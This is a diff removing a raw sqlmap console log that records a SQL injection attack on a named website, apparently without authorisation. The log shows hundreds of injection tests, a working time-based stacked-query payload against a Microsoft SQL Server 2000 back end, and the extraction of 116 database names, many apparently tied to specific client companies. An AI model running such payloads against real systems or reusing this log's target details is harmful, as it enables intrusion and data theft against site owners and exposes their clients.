@@ -1,446 +1,0 @@
-http://link.argifocus.com/5Q3-100640
-        ___
-       __H__
- ___ ___[)]_____ ___ ___  {1.3.5.151#dev}
-|_ -| . [']     | .'| . |
-|___|_  [,]_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 03:16:22 /2019-06-06/
-
-[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[03:16:23] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
-do you want to try URI injections in the target URL itself? [Y/n/q] Y
-[03:16:24] [INFO] testing connection to the target URL
-[03:16:25] [INFO] heuristics detected web page charset 'ascii'
-sqlmap got a 302 redirect to 'http://www.pstechnology.com/'. Do you want to follow? [Y/n] Y
-[03:16:55] [INFO] testing if the target URL content is stable
-[03:17:26] [WARNING] URI parameter '#1*' does not appear to be dynamic
-[03:17:26] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
-[03:17:26] [INFO] testing for SQL injection on URI parameter '#1*'
-[03:17:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[03:17:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
-[03:17:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
-[03:17:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
-[03:17:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
-[03:17:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
-[03:17:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
-[03:17:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
-[03:17:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
-[03:17:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
-[03:18:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
-[03:18:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
-[03:18:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
-[03:18:07] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
-[03:18:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
-[03:18:18] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
-[03:18:22] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
-[03:18:28] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
-[03:18:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
-[03:18:37] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
-[03:18:41] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
-[03:18:47] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
-[03:18:50] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
-[03:18:56] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
-[03:18:59] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[03:18:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
-[03:18:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
-[03:18:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
-[03:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
-[03:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
-[03:19:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
-[03:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
-[03:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
-[03:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
-[03:19:00] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
-[03:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
-[03:19:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
-[03:19:00] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
-[03:19:01] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
-[03:19:01] [INFO] testing 'Informix boolean-based blind - Parameter replace'
-[03:19:01] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
-[03:19:01] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
-[03:19:01] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
-[03:19:01] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
-[03:19:01] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
-[03:19:01] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
-[03:19:01] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
-[03:19:02] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
-[03:19:02] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
-[03:19:02] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
-[03:19:02] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
-[03:19:02] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
-[03:19:02] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
-[03:19:03] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
-[03:19:03] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
-[03:19:03] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
-[03:19:03] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
-[03:19:04] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
-[03:19:04] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
-[03:19:04] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
-[03:19:04] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
-[03:19:04] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
-[03:19:05] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
-[03:19:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
-[03:19:13] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
-[03:19:14] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
-[03:19:16] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
-[03:19:19] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
-[03:19:23] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
-[03:19:26] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
-[03:19:29] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
-[03:19:30] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
-[03:19:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
-[03:19:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
-[03:19:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
-[03:19:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
-[03:19:49] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
-[03:19:53] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
-[03:19:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
-[03:20:01] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
-[03:20:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
-[03:20:08] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
-[03:20:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
-[03:20:16] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
-[03:20:20] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
-[03:20:23] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
-[03:20:27] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
-[03:20:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
-[03:20:32] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
-[03:20:34] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
-[03:20:38] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
-[03:20:40] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
-[03:20:44] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
-[03:20:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
-[03:20:50] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
-[03:20:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
-[03:20:54] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
-[03:20:56] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
-[03:20:59] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
-[03:21:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
-[03:21:05] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
-[03:21:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
-[03:21:10] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
-[03:21:12] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
-[03:21:16] [INFO] testing 'Firebird OR error-based - WHERE or HAVING clause'
-[03:21:18] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
-[03:21:21] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
-[03:21:21] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
-[03:21:21] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
-[03:21:21] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
-[03:21:21] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
-[03:21:21] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
-[03:21:21] [INFO] testing 'PostgreSQL error-based - Parameter replace'
-[03:21:21] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
-[03:21:21] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
-[03:21:21] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
-[03:21:21] [INFO] testing 'Oracle error-based - Parameter replace'
-[03:21:21] [INFO] testing 'Firebird error-based - Parameter replace'
-[03:21:21] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
-[03:21:21] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
-[03:21:22] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
-[03:21:22] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
-[03:21:22] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
-[03:21:22] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
-[03:21:22] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
-[03:21:22] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
-[03:21:23] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
-[03:21:23] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
-[03:21:23] [INFO] testing 'Oracle error-based - ORDER BY, GROUP BY clause'
-[03:21:23] [INFO] testing 'Firebird error-based - ORDER BY clause'
-[03:21:23] [INFO] testing 'MySQL inline queries'
-[03:21:23] [INFO] testing 'PostgreSQL inline queries'
-[03:21:23] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
-[03:21:23] [INFO] testing 'Oracle inline queries'
-[03:21:23] [INFO] testing 'SQLite inline queries'
-[03:21:23] [INFO] testing 'Firebird inline queries'
-[03:21:23] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
-[03:21:25] [INFO] testing 'MySQL > 5.0.11 stacked queries'
-[03:21:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
-[03:21:30] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
-[03:21:33] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
-[03:21:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
-[03:21:37] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
-[03:21:39] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
-[03:21:42] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
-[03:21:43] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
-[03:21:46] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
-[03:21:47] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
-[03:21:49] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
-[03:22:10] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable 
-it looks like the back-end DBMS is '['Microsoft SQL Server', 'Sybase']'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-[03:22:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[03:22:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[03:22:11] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
-[03:22:13] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
-[03:22:14] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
-[03:22:15] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
-[03:22:16] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
-[03:22:17] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
-[03:22:18] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
-[03:22:18] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
-[03:22:19] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
-[03:22:20] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
-URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 4223 HTTP(s) requests:
----
-Parameter: #1* (URI)
-    Type: stacked queries
-    Title: Microsoft SQL Server/Sybase stacked queries (comment)
-    Payload: http://link.argifocus.com:80/5Q3-100640';WAITFOR DELAY '0:0:5'--
----
-[03:24:13] [INFO] testing Microsoft SQL Server
-[03:24:13] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
-[03:24:23] [INFO] confirming Microsoft SQL Server
-[03:24:33] [INFO] the back-end DBMS is Microsoft SQL Server
-web server operating system: Windows 2003 or XP
-web application technology: ASP.NET, Microsoft IIS 6.0, ASP
-back-end DBMS: Microsoft SQL Server 2000
-[03:24:33] [INFO] fetching database names
-[03:24:33] [INFO] fetching number of databases
-[03:24:33] [INFO] retrieved: 
-[03:24:43] [INFO] adjusting time delay to 1 second due to good response times
-116
-[03:24:52] [INFO] retrieved: [03:24:52] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
-AffinityGr_1
-[03:26:23] [INFO] retrieved: AffinityGr_4
-[03:27:55] [INFO] retrieved: AmericanPTA
-[03:28:59] [INFO] retrieved: ASI
-[03:29:13] [INFO] retrieved: Bellerophon
-[03:30:38] [INFO] retrieved: BobitBMed
-[03:31:43] [INFO] retrieved: BobitBMedia
-[03:32:55] [INFO] retrieved: BobitBMedia_4
-[03:34:28] [INFO] retrieved: BridalG
-[03:35:15] [INFO] retrieved: BusinessW
-[03:36:18] [INFO] retrieved: ClientLink
-[03:37:29] [INFO] retrieved: CreativeAPIn
-[03:38:52] [INFO] retrieved: CreativeAPInc_3
-[03:40:40] [INFO] retrieved: DentalProd
-[03:41:56] [INFO] retrieved: DentalProd_1
-[03:43:28] [INFO] retrieved: DentistryTI
-[03:44:50] [INFO] retrieved: ElsevierP
-[03:45:51] [INFO] retrieved: EmmisC
-[03:46:29] [INFO] retrieved: EmmisCo
-[03:47:18] [INFO] retrieved: EmmisComm
-[03:48:20] [INFO] retrieved: EmmisCommun
-[03:49:38] [INFO] retrieved: EmmisCommuni
-[03:51:01] [INFO] retrieved: EntrepreneMI
-[03:52:26] [INFO] retrieved: ESPN_1
-[03:53:13] [INFO] retrieved: FloridaTMIn
-[03:54:35] [INFO] retrieved: Focus
-[03:55:11] [INFO] retrieved: FWP
-[03:55:38] [INFO] retrieved: FWPub
-[03:56:18] [INFO] retrieved: FWPubl
-[03:57:07] [INFO] retrieved: GJUP_demo
-[03:58:18] [INFO] retrieved: GreatAP
-[03:59:10] [INFO] retrieved: GreatAPub
-[04:00:15] [INFO] retrieved: GreatAPubl
-[04:01:29] [INFO] retrieved: GreatAPubli
-[04:02:48] [INFO] retrieved: GreatAPublis
-[04:04:13] [INFO] retrieved: Guideposts
-[04:05:26] [INFO] retrieved: HospitalitD
-[04:06:50] [INFO] retrieved: IDPP
-[04:07:23] [INFO] retrieved: Import
-[04:08:11] [INFO] retrieved: Impression
-[04:09:22] [INFO] retrieved: ITClientShare
-[04:10:52] [INFO] retrieved: itexports
-[04:12:04] [INFO] retrieved: ITMaster
-[04:12:56] [INFO] retrieved: ITModel
-[04:13:47] [INFO] retrieved: ITModelData
-[04:15:02] [INFO] retrieved: ITModelLM
-[04:16:07] [INFO] retrieved: ITReport
-[04:17:08] [INFO] retrieved: ITSystem
-[04:18:04] [INFO] retrieved: ITSYstem11212018
-[04:19:37] [INFO] retrieved: ITSystemBackup
-[04:21:17] [INFO] retrieved: JobsonMIL
-[04:22:25] [INFO] retrieved: KingPI
-[04:23:08] [INFO] retrieved: KnowledgeCenter
-[04:24:56] [INFO] retrieved: LeisurePCom
-[04:26:11] [INFO] retrieved: LeisurePCompa
-[04:27:40] [INFO] retrieved: lesne
-[04:28:16] [INFO] retrieved: MarthaSLOInc
-[04:29:42] [INFO] retrieved: master
-[04:30:20] [INFO] retrieved: Mississipp
-[04:31:31] [INFO] retrieved: model
-[04:32:09] [INFO] retrieved: ModernBride
-[04:33:28] [INFO] retrieved: msdb
-[04:33:55] [INFO] retrieved: NationalGe
-[04:35:08] [INFO] retrieved: NationalGT
-[04:36:23] [INFO] retrieved: NationalPaCA
-[04:37:41] [INFO] retrieved: NationalTfHP
-[04:39:22] [INFO] retrieved: NewYT
-[04:40:06] [INFO] retrieved: NewYTi
-[04:40:56] [INFO] retrieved: OgdenPIn
-[04:41:58] [INFO] retrieved: OgdenPInc_1
-[04:43:22] [INFO] retrieved: OgdenPInc_2
-[04:44:47] [INFO] retrieved: OgdenPInc_4
-[04:46:15] [INFO] retrieved: OgdenPInc_5
-[04:47:41] [INFO] retrieved: OgdenPInc_6
-[04:49:09] [INFO] retrieved: Peninsula
-[04:50:13] [INFO] retrieved: Peninsula_1
-[04:51:35] [INFO] retrieved: PentonMedia_5
-[04:53:16] [INFO] retrieved: Primedia_11
-[04:54:28] [INFO] retrieved: Primedia_17
-[04:55:41] [INFO] retrieved: Primedia_20
-[04:56:53] [INFO] retrieved: Primedia_3
-[04:58:02] [INFO] retrieved: Primedia_38
-[04:59:20] [INFO] retrieved: Primedia_6
-[05:00:30] [INFO] retrieved: Primedia_7
-[05:01:41] [INFO] retrieved: ProServices
-[05:03:03] [INFO] retrieved: ProtectAme
-[05:04:20] [INFO] retrieved: RCIL
-[05:04:45] [INFO] retrieved: RDP
-[05:05:10] [INFO] retrieved: RDPubl
-[05:05:56] [INFO] retrieved: Recommend_2
-[05:07:16] [INFO] retrieved: RestoreMLL
-[05:08:31] [INFO] retrieved: RestoreMLLC
-[05:09:51] [INFO] retrieved: SierraC
-[05:10:32] [INFO] retrieved: SouthernPCo
-[05:11:58] [INFO] retrieved: SouthernPCorp
-[05:13:42] [INFO] retrieved: SouthernPCorpo
-[05:15:33] [INFO] retrieved: SouthernPCorporati
-[05:17:47] [INFO] retrieved: STNMG
-[05:18:25] [INFO] retrieved: tempdb
-[05:19:09] [INFO] retrieved: TexasDoT
-[05:20:17] [INFO] retrieved: TexasDoTr
-[05:21:34] [INFO] retrieved: TheMGI
-[05:22:18] [INFO] retrieved: TheMGIn
-[05:23:14] [INFO] retrieved: TradePPCorp_10
-[05:24:58] [INFO] retrieved: TradePPCorp_11
-[05:26:44] [INFO] retrieved: TradePPCorp_12
-[05:28:29] [INFO] retrieved: TradePPCorp_13
-[05:30:17] [INFO] retrieved: TradePPCorp_4
-[05:32:02] [INFO] retrieved: TradePPCorp_5
-[05:33:45] [INFO] retrieved: TradePPCorp_6
-[05:35:29] [INFO] retrieved: TradePPCorp_7
-[05:37:15] [INFO] retrieved: TradePPCorp_8
-[05:39:01] [INFO] retrieved: TradePPCorp_9
-[05:40:44] [INFO] retrieved: UniversalM
-[05:41:52] [INFO] retrieved: VisitDenve
-[05:43:05] [INFO] retrieved: YankeePI
-available databases [116]:
-[*] AffinityGr_1
-[*] AffinityGr_4
-[*] AmericanPTA
-[*] ASI
-[*] Bellerophon
-[*] BobitBMed
-[*] BobitBMedia
-[*] BobitBMedia_4
-[*] BridalG
-[*] BusinessW
-[*] ClientLink
-[*] CreativeAPIn
-[*] CreativeAPInc_3
-[*] DentalProd
-[*] DentalProd_1
-[*] DentistryTI
-[*] ElsevierP
-[*] EmmisC
-[*] EmmisCo
-[*] EmmisComm
-[*] EmmisCommun
-[*] EmmisCommuni
-[*] EntrepreneMI
-[*] ESPN_1
-[*] FloridaTMIn
-[*] Focus
-[*] FWP
-[*] FWPub
-[*] FWPubl
-[*] GJUP_demo
-[*] GreatAP
-[*] GreatAPub
-[*] GreatAPubl
-[*] GreatAPubli
-[*] GreatAPublis
-[*] Guideposts
-[*] HospitalitD
-[*] IDPP
-[*] Import
-[*] Impression
-[*] ITClientShare
-[*] itexports
-[*] ITMaster
-[*] ITModel
-[*] ITModelData
-[*] ITModelLM
-[*] ITReport
-[*] ITSystem
-[*] ITSYstem11212018
-[*] ITSystemBackup
-[*] JobsonMIL
-[*] KingPI
-[*] KnowledgeCenter
-[*] LeisurePCom
-[*] LeisurePCompa
-[*] lesne
-[*] MarthaSLOInc
-[*] master
-[*] Mississipp
-[*] model
-[*] ModernBride
-[*] msdb
-[*] NationalGe
-[*] NationalGT
-[*] NationalPaCA
-[*] NationalTfHP
-[*] NewYT
-[*] NewYTi
-[*] OgdenPIn
-[*] OgdenPInc_1
-[*] OgdenPInc_2
-[*] OgdenPInc_4
-[*] OgdenPInc_5
-[*] OgdenPInc_6
-[*] Peninsula
-[*] Peninsula_1
-[*] PentonMedia_5
-[*] Primedia_11
-[*] Primedia_17
-[*] Primedia_20
-[*] Primedia_3
-[*] Primedia_38
-[*] Primedia_6
-[*] Primedia_7
-[*] ProServices
-[*] ProtectAme
-[*] RCIL
-[*] RDP
-[*] RDPubl
-[*] Recommend_2
-[*] RestoreMLL
-[*] RestoreMLLC
-[*] SierraC
-[*] SouthernPCo
-[*] SouthernPCorp
-[*] SouthernPCorpo
-[*] SouthernPCorporati
-[*] STNMG
-[*] tempdb
-[*] TexasDoT
-[*] TexasDoTr
-[*] TheMGI
-[*] TheMGIn
-[*] TradePPCorp_10
-[*] TradePPCorp_11
-[*] TradePPCorp_12
-[*] TradePPCorp_13
-[*] TradePPCorp_4
-[*] TradePPCorp_5
-[*] TradePPCorp_6
-[*] TradePPCorp_7
-[*] TradePPCorp_8
-[*] TradePPCorp_9
-[*] UniversalM
-[*] VisitDenve
-[*] YankeePI
-
-[05:43:54] [WARNING] HTTP error codes detected during run:
-400 (Bad Request) - 321 times
-[05:43:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/link.argifocus.com'
-
-[*] ending @ 05:43:54 /2019-06-06/
-
